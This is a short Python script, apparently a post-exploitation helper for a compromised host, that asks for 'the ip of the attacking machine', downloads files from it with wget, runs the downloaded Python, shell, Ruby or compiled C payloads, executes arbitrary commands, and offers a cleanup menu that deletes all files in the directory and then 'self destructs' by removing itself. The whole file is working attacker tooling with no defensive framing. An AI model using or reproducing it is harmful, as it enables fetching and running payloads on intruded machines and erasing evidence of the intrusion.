#python
import os

def s(cmd):
    os.system(cmd)

print("What is the ip of the attacking machine?")
ip = input("> ")
while True:
    print("\n")
    print("What do you want to do?\n 1) dowload a file\n 2) run a file\n 3) run a command\n 4) cleanup\n 99) exit")
    user = input("> ")
    if(user=='1'):
        print("")
        f = input(" -What file do you want?\n> ")
        s("wget "+ip+":8000/"+f)

    elif(user=='2'):
        print("")
        f = input(" -What is the name of the file?\n> ")
        nd = f.split(".")[1]
        if(nd=="py"):
            s("python "+f)
        elif(nd=="sh"):
            s("bash "+f)
        elif(nd=="rb"):
            s("ruby "+f)
        elif(nd=="c"):
            name = f.split(".")[0]
            s("gcc "+f+" -o "+name)
            s("chmod +x "+name)
            s("./"+name)
        else:
            print(" -Unknown file type")
            print(" -Please enter the command to run it")
            cmd = input("> ")
            s(cmd)

    elif(user=='3'):
        s(input("-$ "))

    elif(user=='4'):
        print("")
        print(" -Nuke option? [y/N] (remove all file from dir)")
        ans = input("> ")
        if(ans=="y" or ans=="Y" or ans=="yes" or ans=="Yes"):
            s("rm *.*")
            s("rm *")
        elif(ans=="n" or ans=="N" or ans=="no" or ans=="No" or ans==""):
            print("  -Input file names to remove. 'END!' to end")
            while True:
                n = input("> ")
                if(n=="END!"):
                    break
                else:
                    s("rm "+n)
            print("")
            sd = input(" -Self destruct? [y/N]\n> ")
            if(sd=='y' or sd=='Y' or sd=='yes' or sd=='Yes'):
                s("rm upload.py")

    elif(user=='99'):
        print("Good doing buisness with ya ;)")
        break
